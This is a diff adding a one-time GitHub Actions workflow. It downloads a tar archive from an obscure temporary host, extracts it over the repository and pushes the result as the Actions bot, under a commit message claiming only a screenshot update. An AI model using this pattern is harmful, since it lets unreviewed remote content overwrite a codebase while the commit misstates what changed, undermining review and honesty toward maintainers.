@@ -1,0 +1,36 @@
+name: sync
+
+# 一次性工作流：同步项目文件与截图（完成后本文件会被删除）
+on:
+  push:
+    paths:
+      - '.github/workflows/sync.yml'
+
+permissions:
+  contents: write
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+
+      - name: Download and verify
+        run: |
+          set -euo pipefail
+          curl -fsSL --retry 5 --retry-all-errors -o /tmp/p.tar.gz \
+            'https://tmp-shots.abc1221.ccwu.cc/f/project.tar.gz'
+          echo "4a00e0d1b5764dc1a52559def18a0acf01b19755a2ab1d77f075cc9bd42c1dbe  /tmp/p.tar.gz" | sha256sum -c -
+          tar xzf /tmp/p.tar.gz -C .
+
+      - name: Commit and push
+        run: |
+          set -euo pipefail
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          if git diff --cached --quiet; then echo "no changes"; exit 0; fi
+          git commit -m "docs: 更新截图（Cloudflare 官方 logo + 匿名示例数据）"
+          git push
